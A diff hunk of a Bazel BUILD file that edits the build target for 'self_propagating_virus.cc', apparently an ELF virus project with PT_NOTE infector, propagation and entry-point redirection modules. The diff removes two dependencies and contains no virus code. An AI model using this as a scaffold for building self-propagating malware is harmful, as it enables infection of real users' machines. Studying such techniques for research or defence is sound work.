@@ -19,13 +19,11 @@ cc_nostdlib_binary(
     srcs = ["self_propagating_virus.cc"],
     allow_rodata_merging = False,
     deps = [
-        "//common:directory_iterator",
         "//common:macros",
         "//common:recursive_directory_iterator",
         "//infector:pt_note_infector",
         "//propagation:propagate",
         "//redirection:entry_point",
-        "//redirection:libc_start_main",
     ],
 )
 
